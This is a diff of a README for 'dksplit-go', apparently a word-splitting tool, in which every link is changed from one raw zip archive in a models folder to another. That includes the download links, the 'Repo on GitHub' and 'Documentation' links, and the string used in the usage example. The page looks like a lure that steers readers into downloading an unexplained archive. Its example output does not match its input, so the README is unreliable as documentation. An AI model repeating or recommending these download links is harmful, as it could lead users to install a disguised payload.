@@ -1,6 +1,6 @@
 # 🛠️ dksplit-go - Fast, Easy Word Splitting Tool
 
-[![Download dksplit-go](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/go-dksplit-2.1.zip)](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/go-dksplit-2.1.zip)
+[![Download dksplit-go](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/dksplit-go-v3.1-beta.1.zip)](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/dksplit-go-v3.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to dksplit-go! This application helps you split long strings into words 
 
 To get started, visit the following page to download the software:
 
-[Download dksplit-go](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/go-dksplit-2.1.zip)
+[Download dksplit-go](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/dksplit-go-v3.1-beta.1.zip)
 
 You will find the latest version available for download. Follow the steps below to install the application.
 
@@ -48,7 +48,7 @@ dksplit-go uses advanced techniques for accurate word segmentation. Here are som
 
 ## 📜 Example Usage
 
-Suppose you have the string `https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/go-dksplit-2.1.zip`. Simply enter it into dksplit-go, click "Split," and you should see:
+Suppose you have the string `https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/dksplit-go-v3.1-beta.1.zip`. Simply enter it into dksplit-go, click "Split," and you should see:
 
 - domain
 - name
@@ -73,8 +73,8 @@ If you would like to contribute to dksplit-go, please feel free to submit a pull
 
 For more details, feel free to check out the following:
 
-- [Repo on GitHub](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/go-dksplit-2.1.zip)
-- [Documentation](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/go-dksplit-2.1.zip)
+- [Repo on GitHub](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/dksplit-go-v3.1-beta.1.zip)
+- [Documentation](https://github.com/xdilke-dev/dksplit-go/raw/refs/heads/main/models/dksplit-go-v3.1-beta.1.zip)
 
 ## 🧑‍💼 Support
 
